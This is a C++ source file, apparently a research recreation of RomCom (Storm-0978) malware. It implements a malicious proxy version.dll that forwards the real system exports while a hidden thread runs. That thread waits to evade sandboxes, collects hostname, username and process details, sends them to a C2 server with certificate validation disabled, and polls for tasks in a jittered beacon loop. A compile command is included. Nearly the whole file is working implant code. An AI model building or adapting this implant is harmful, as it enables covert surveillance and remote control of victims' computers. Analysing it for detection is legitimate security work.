// RomCom (Storm-0978) - DLL Side-Loading Payload
// Demonstrates DLL proxying technique for stealthy execution
// MITRE ATT&CK: T1574.002 (DLL Side-Loading), T1055.001 (DLL Injection)

// For educational and research purposes only
// Author: Nour A
// Reference: https://unit42.paloaltonetworks.com/romcom-threat-actor/

// compile: x86_64-w64-mingw32-g++ -shared -o version.dll dll_sideloader.cpp -lws2_32 -lwininet -static

#include <windows.h>
#include <wininet.h>
#include <stdio.h>
#include <string>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "wininet.lib")

// -- Configuration --
#define C2_HOST "c2.example.com"
#define C2_PORT 443
#define BEACON_PATH "/api/v1/tasks"
#define REG_PATH "/api/v1/auth/token"

// handle to the real system DLL (for proxying)
static HMODULE hRealDLL = NULL;

// XOR key for string obfuscation
static BYTE xor_key[] = { 0x52, 0x4F, 0x4D, 0x43, 0x4F, 0x4D }; // "ROMCOM"


// ---- String Obfuscation ----

std::string xor_decode(const BYTE* data, size_t len, const BYTE* key, size_t keyLen) {
    std::string result(len, '\0');
    for (size_t i = 0; i < len; i++) {
        result[i] = data[i] ^ key[i % keyLen];
    }
    return result;
}


// ---- Real DLL Loading and Function Proxying ----

typedef DWORD (WINAPI *pGetFileVersionInfoSizeA)(LPCSTR, LPDWORD);
typedef BOOL  (WINAPI *pGetFileVersionInfoA)(LPCSTR, DWORD, DWORD, LPVOID);
typedef BOOL  (WINAPI *pVerQueryValueA)(LPCVOID, LPCSTR, LPVOID*, PUINT);
typedef DWORD (WINAPI *pGetFileVersionInfoSizeW)(LPCWSTR, LPDWORD);
typedef BOOL  (WINAPI *pGetFileVersionInfoW)(LPCWSTR, DWORD, DWORD, LPVOID);
typedef BOOL  (WINAPI *pVerQueryValueW)(LPCVOID, LPCWSTR, LPVOID*, PUINT);

static pGetFileVersionInfoSizeA real_GetFileVersionInfoSizeA = NULL;
static pGetFileVersionInfoA     real_GetFileVersionInfoA     = NULL;
static pVerQueryValueA          real_VerQueryValueA          = NULL;
static pGetFileVersionInfoSizeW real_GetFileVersionInfoSizeW = NULL;
static pGetFileVersionInfoW     real_GetFileVersionInfoW     = NULL;
static pVerQueryValueW          real_VerQueryValueW          = NULL;


BOOL LoadRealDLL() {
    // load the real version.dll from System32
    char systemDir[MAX_PATH];
    GetSystemDirectoryA(systemDir, MAX_PATH);

    char realDllPath[MAX_PATH];
    snprintf(realDllPath, MAX_PATH, "%s\\version.dll", systemDir);

    hRealDLL = LoadLibraryA(realDllPath);
    if (!hRealDLL) {
        return FALSE;
    }

    // resolve all exported functions
    real_GetFileVersionInfoSizeA = (pGetFileVersionInfoSizeA)
        GetProcAddress(hRealDLL, "GetFileVersionInfoSizeA");
    real_GetFileVersionInfoA = (pGetFileVersionInfoA)
        GetProcAddress(hRealDLL, "GetFileVersionInfoA");
    real_VerQueryValueA = (pVerQueryValueA)
        GetProcAddress(hRealDLL, "VerQueryValueA");
    real_GetFileVersionInfoSizeW = (pGetFileVersionInfoSizeW)
        GetProcAddress(hRealDLL, "GetFileVersionInfoSizeW");
    real_GetFileVersionInfoW = (pGetFileVersionInfoW)
        GetProcAddress(hRealDLL, "GetFileVersionInfoW");
    real_VerQueryValueW = (pVerQueryValueW)
        GetProcAddress(hRealDLL, "VerQueryValueW");

    return TRUE;
}


// ---- Proxied Exports ----
// these are the functions the legitimate application expects from version.dll
// we forward all calls to the real DLL while our payload runs in background

extern "C" __declspec(dllexport) DWORD WINAPI
GetFileVersionInfoSizeA(LPCSTR lptstrFilename, LPDWORD lpdwHandle) {
    if (real_GetFileVersionInfoSizeA)
        return real_GetFileVersionInfoSizeA(lptstrFilename, lpdwHandle);
    return 0;
}

extern "C" __declspec(dllexport) BOOL WINAPI
GetFileVersionInfoA(LPCSTR lptstrFilename, DWORD dwHandle,
                    DWORD dwLen, LPVOID lpData) {
    if (real_GetFileVersionInfoA)
        return real_GetFileVersionInfoA(lptstrFilename, dwHandle, dwLen, lpData);
    return FALSE;
}

extern "C" __declspec(dllexport) BOOL WINAPI
VerQueryValueA(LPCVOID pBlock, LPCSTR lpSubBlock,
               LPVOID* lplpBuffer, PUINT puLen) {
    if (real_VerQueryValueA)
        return real_VerQueryValueA(pBlock, lpSubBlock, lplpBuffer, puLen);
    return FALSE;
}

extern "C" __declspec(dllexport) DWORD WINAPI
GetFileVersionInfoSizeW(LPCWSTR lptstrFilename, LPDWORD lpdwHandle) {
    if (real_GetFileVersionInfoSizeW)
        return real_GetFileVersionInfoSizeW(lptstrFilename, lpdwHandle);
    return 0;
}

extern "C" __declspec(dllexport) BOOL WINAPI
GetFileVersionInfoW(LPCWSTR lptstrFilename, DWORD dwHandle,
                    DWORD dwLen, LPVOID lpData) {
    if (real_GetFileVersionInfoW)
        return real_GetFileVersionInfoW(lptstrFilename, dwHandle, dwLen, lpData);
    return FALSE;
}

extern "C" __declspec(dllexport) BOOL WINAPI
VerQueryValueW(LPCVOID pBlock, LPCWSTR lpSubBlock,
               LPVOID* lplpBuffer, PUINT puLen) {
    if (real_VerQueryValueW)
        return real_VerQueryValueW(pBlock, lpSubBlock, lplpBuffer, puLen);
    return FALSE;
}


// ---- Payload Functions ----

void CollectSystemInfo(char* buffer, size_t bufSize) {
    char hostname[256] = {0};
    char username[256] = {0};
    DWORD hostnameLen = sizeof(hostname);
    DWORD usernameLen = sizeof(username);

    GetComputerNameA(hostname, &hostnameLen);
    GetUserNameA(username, &usernameLen);

    OSVERSIONINFOA osvi;
    ZeroMemory(&osvi, sizeof(osvi));
    osvi.dwOSVersionInfoSize = sizeof(osvi);

    // get architecture
    SYSTEM_INFO si;
    GetNativeSystemInfo(&si);
    const char* arch = (si.wProcessorArchitecture == 9) ? "x64" : "x86";

    snprintf(buffer, bufSize,
        "{\"hostname\":\"%s\",\"user\":\"%s\",\"arch\":\"%s\","
        "\"pid\":%lu,\"os_ver\":\"%lu.%lu\"}",
        hostname, username, arch,
        GetCurrentProcessId(),
        osvi.dwMajorVersion, osvi.dwMinorVersion
    );
}


BOOL BeaconC2(const char* host, int port, const char* path,
              const char* data, char* response, size_t respSize) {
    HINTERNET hInternet = InternetOpenA(
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0
    );
    if (!hInternet) return FALSE;

    HINTERNET hConnect = InternetConnectA(
        hInternet, host, (INTERNET_PORT)port,
        NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0
    );
    if (!hConnect) {
        InternetCloseHandle(hInternet);
        return FALSE;
    }

    DWORD flags = INTERNET_FLAG_SECURE |
                  INTERNET_FLAG_IGNORE_CERT_CN_INVALID |
                  INTERNET_FLAG_IGNORE_CERT_DATE_INVALID |
                  INTERNET_FLAG_NO_CACHE_WRITE;

    HINTERNET hRequest = HttpOpenRequestA(
        hConnect, data ? "POST" : "GET", path,
        "HTTP/1.1", NULL, NULL, flags, 0
    );
    if (!hRequest) {
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return FALSE;
    }

    // add headers
    const char* headers = "Content-Type: application/json\r\n"
                          "Accept: application/json\r\n";
    HttpAddRequestHeadersA(hRequest, headers, -1,
                           HTTP_ADDREQ_FLAG_ADD);

    // send request
    BOOL sent;
    if (data) {
        sent = HttpSendRequestA(hRequest, NULL, 0,
                                (LPVOID)data, (DWORD)strlen(data));
    } else {
        sent = HttpSendRequestA(hRequest, NULL, 0, NULL, 0);
    }

    if (sent && response) {
        DWORD bytesRead;
        InternetReadFile(hRequest, response, (DWORD)respSize - 1, &bytesRead);
        response[bytesRead] = '\0';
    }

    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);

    return sent;
}


DWORD WINAPI PayloadThread(LPVOID lpParam) {
    // wait before activating (avoid sandbox timeout analysis)
    Sleep(5000);

    // collect system info
    char sysinfo[2048] = {0};
    CollectSystemInfo(sysinfo, sizeof(sysinfo));

    // registration beacon
    char regResponse[4096] = {0};
    BeaconC2(C2_HOST, C2_PORT, REG_PATH, sysinfo,
             regResponse, sizeof(regResponse));

    // main beacon loop
    while (TRUE) {
        char taskResponse[8192] = {0};
        BeaconC2(C2_HOST, C2_PORT, BEACON_PATH, NULL,
                 taskResponse, sizeof(taskResponse));

        // parse and execute tasks...
        // (command execution, file operations, etc.)

        // jittered sleep (30s +/- 5s)
        DWORD jitter = (rand() % 10000) - 5000;
        Sleep(30000 + jitter);
    }

    return 0;
}


// ---- DLL Entry Point ----

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call,
                      LPVOID lpReserved) {
    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH:
        DisableThreadLibraryCalls(hModule);

        // load the real DLL for proxying
        if (!LoadRealDLL()) {
            // if real DLL not found, continue anyway
            // (the application may not need all exports)
        }

        // start payload in background thread
        CreateThread(NULL, 0, PayloadThread, NULL, 0, NULL);
        break;

    case DLL_PROCESS_DETACH:
        if (hRealDLL) {
            FreeLibrary(hRealDLL);
        }
        break;
    }

    return TRUE;
}
